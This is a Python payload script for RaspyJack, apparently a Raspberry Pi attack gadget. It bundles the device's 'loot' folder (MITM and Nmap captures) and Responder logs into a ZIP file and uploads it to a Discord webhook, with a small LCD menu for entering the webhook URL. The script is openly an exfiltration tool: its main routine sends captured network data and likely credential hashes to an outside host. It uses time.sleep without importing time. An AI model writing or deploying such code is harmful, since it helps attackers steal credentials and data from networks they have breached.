#!/usr/bin/env python3
"""
RaspyJack *payload* – **Upload Loot to Discord**
================================================
This script gathers:

* everything under the local **loot/** folder, **including** the *MITM/*
  and *Nmap/* sub‑directories;
* every file in **./Responder/logs/**

…bundles them into a single **ZIP archive** and uploads it as an
attachment to a Discord *webhook*.

It follows the same « heavily commented & beginner‑friendly » style as
*example_show_buttons.py* so you can understand and tweak every step.

Usage
-----

1.  Put this file in RaspyJack’s *payloads/* directory.
2.  Edit the ``WEBHOOK_URL`` constant below so it contains **your own** Discord webhook URL.
3.  Run it manually **or** add it to RaspyJack’s menu just like the other payloads.

Discord limits a single upload to **≤ 8 MiB** for standard (non Nitro) accounts.  The script will warn you if the archive is larger.
"""

# ---------------------------------------------------------------------------
# 0) Standard library imports
# ---------------------------------------------------------------------------
import os, sys, io, zipfile, datetime, signal, textwrap
from pathlib import Path          # path handling in an OS‑agnostic way

# ---------------------------- Third‑party libs ----------------------------
try:
    import requests               # HTTP – pip install requests
except ModuleNotFoundError as exc:
    print("[ERROR] The 'requests' library is missing – install it with:\n    sudo apt install python3-requests",
          file=sys.stderr)
    # We can't draw to LCD without LCD libs, so just exit here.
    sys.exit(1)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LOOT_DIR       = Path("/root/Raspyjack/loot") # Absolute path for consistency
RESPONDER_DIR  = Path("/root/Raspyjack/Responder/logs") # Absolute path

WEBHOOK_URL = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxx/YYYYYYYYYYYYY" #<- EDIT ME!
DISCORD_SIZE_LIMIT = 8 * 1024 * 1024 # Discord’s hard attachment cap (bytes) – 8 MiB for free users.

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
current_webhook_input = WEBHOOK_URL # For editing
webhook_input_cursor_pos = 0

def cleanup(*_):
    global running
    running = False
    print("\n[INFO] Interruption received – cleaning up…")

signal.signal(signal.SIGINT,  cleanup)   # Ctrl‑C
signal.signal(signal.SIGTERM, cleanup)   # kill or RaspyJack quit

# --- UI Functions ---
def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status_msg=""):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Exfiltrate Discord", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Webhook URL:", font=FONT, fill="white")
        d.text((5, 45), WEBHOOK_URL[:16] + "...", font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Status:", font=FONT, fill="white")
        d.text((5, 80), status_msg, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Upload | KEY1=Edit URL | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "url_input":
        d.text((5, 30), "Edit Webhook URL:", font=FONT, fill="white")
        display_url = list(current_webhook_input)
        if webhook_input_cursor_pos < len(display_url):
            display_url[webhook_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_url[:16]), font=FONT_TITLE, fill="yellow") # Show first 16 chars
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "uploading":
        d.text((5, 50), "Building Archive...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), status_msg, font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_url_input_logic(initial_url):
    global current_webhook_input, webhook_input_cursor_pos
    current_webhook_input = initial_url
    webhook_input_cursor_pos = len(initial_url) - 1 # Start cursor at end
    
    draw_ui("url_input")
    
    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[]@!$&'()*+,;=%" # Common URL chars
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel URL input
            return None
        
        if btn == "OK": # Confirm URL
            # Basic validation: check for http/https and discord.com
            if current_webhook_input.startswith("https://discord.com/api/webhooks/"):
                return current_webhook_input
            else:
                show_message(["Invalid URL!", "Must be Discord", "webhook."], "red")
                time.sleep(3)
                current_webhook_input = initial_url # Reset to initial
                webhook_input_cursor_pos = len(initial_url) - 1
                draw_ui("url_input")
        
        if btn == "LEFT":
            webhook_input_cursor_pos = max(0, webhook_input_cursor_pos - 1)
            draw_ui("url_input")
        elif btn == "RIGHT":
            webhook_input_cursor_pos = min(len(current_webhook_input), webhook_input_cursor_pos + 1)
            draw_ui("url_input")
        elif btn == "UP" or btn == "DOWN":
            if webhook_input_cursor_pos < len(current_webhook_input):
                char_list = list(current_webhook_input)
                current_char = char_list[webhook_input_cursor_pos]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else: # DOWN
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[webhook_input_cursor_pos] = char_set[char_index]
                    current_webhook_input = "".join(char_list)
                except ValueError: # If current char is not in char_set (e.g., a space)
                    char_list[webhook_input_cursor_pos] = char_set[0] # Default to first char
                    current_webhook_input = "".join(char_list)
                draw_ui("url_input")
        
        time.sleep(0.1)
    return None

# ---------------------------------------------------------------------------
# 4) Helper: recursively add a directory to a ZIP archive
# ---------------------------------------------------------------------------
def add_directory_to_zip(zip_file: zipfile.ZipFile, base_dir: Path, arc_prefix: str="") -> None:
    """Walk *base_dir* and add every file to *zip_file*.

    *arc_prefix* lets us place files under a different *virtual* folder
    inside the archive (handy if several source directories collide).
    """
    for path in base_dir.rglob("*"):
        if path.is_file():
            # Relative path inside the ZIP, e.g. «Responder/logs/foo.txt»
            arcname = os.path.join(arc_prefix, path.relative_to(base_dir.parent).as_posix())
            zip_file.write(path, arcname)

# ---------------------------------------------------------------------------
# 5) Create the ZIP archive in‑memory (BytesIO buffer)
# ---------------------------------------------------------------------------
def build_archive() -> io.BytesIO:
    """Return an in‑memory ZIP containing every required file."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Add loot/, MITM/ and Nmap/   – preserve existing hierarchy
        if LOOT_DIR.exists():
            add_directory_to_zip(zf, LOOT_DIR)

        # Responder logs go under «Responder/logs/» inside the archive
        if RESPONDER_DIR.exists():
            add_directory_to_zip(zf, RESPONDER_DIR, arc_prefix="Responder/logs")

    buf.seek(0)  # rewind so .read() returns the full archive
    return buf

# ---------------------------------------------------------------------------
# 6) Upload to Discord
# ---------------------------------------------------------------------------
def send_to_discord(archive: io.BytesIO) -> bool:
    """POST *archive* to the configured webhook."""
    global WEBHOOK_URL

    file_size = archive.getbuffer().nbytes
    if file_size > DISCORD_SIZE_LIMIT:
        show_message([f"Archive is {file_size/1024/1024:.1f}MB", "Exceeds 8MB limit!"], "red")
        time.sleep(3)
        return False

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"loot_{timestamp}.zip"

    payload = {"content": f"📦 Fresh loot ({timestamp})"}
    files   = {"file": (filename, archive, "application/zip")}

    draw_ui("uploading", "Uploading to Discord...")
    try:
        resp = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=60)

        if resp.status_code == 204:
            show_message(["Upload successful!"], "lime")
            time.sleep(2)
            return True
        else:
            show_message([f"Upload failed!", f"Code: {resp.status_code}"], "red")
            print(f"[ERROR] Discord responded with {resp.status_code}: {resp.text}", file=sys.stderr)
            time.sleep(3)
            return False
    except requests.exceptions.ConnectionError:
        show_message(["Upload failed!", "No internet?"], "red")
        time.sleep(3)
        return False
    except requests.exceptions.Timeout:
        show_message(["Upload failed!", "Timeout!"], "red")
        time.sleep(3)
        return False
    except Exception as e:
        show_message(["Upload failed!", str(e)[:20]], "red")
        print(f"[ERROR] Unexpected error during upload: {e}", file=sys.stderr)
        time.sleep(3)
        return False

# ---------------------------------------------------------------------------
# 7) Main routine
# ---------------------------------------------------------------------------
def main() -> None:
    global WEBHOOK_URL
    
    # Initial check for webhook URL
    if "discord.com/api/webhooks/xxxxxxxx" in WEBHOOK_URL:
        show_message(["ERROR:", "Webhook URL not", "configured!"], "red")
        time.sleep(3)
        # Allow user to edit it immediately
        new_url = handle_url_input_logic(WEBHOOK_URL)
        if new_url:
            WEBHOOK_URL = new_url
        else:
            sys.exit(1) # Exit if user cancels initial setup

    current_screen = "main"
    while running:
        if current_screen == "main":
            draw_ui("main", "Ready")
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                draw_ui("uploading", "Building archive...")
                archive = build_archive()
                if running: # Check if cleanup was called during archive building
                    send_to_discord(archive)
                time.sleep(0.3) # Debounce
            
            if GPIO.input(PINS["KEY1"]) == 0: # Edit Webhook URL
                new_url = handle_url_input_logic(WEBHOOK_URL)
                if new_url:
                    WEBHOOK_URL = new_url
                time.sleep(0.3) # Debounce
        
        elif current_screen == "url_input":
            # This state is handled by handle_url_input_logic
            pass
        
        time.sleep(0.1)

# ---------------------------------------------------------------------------
# 8) Run as a script
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Exfiltrate Discord payload finished.")

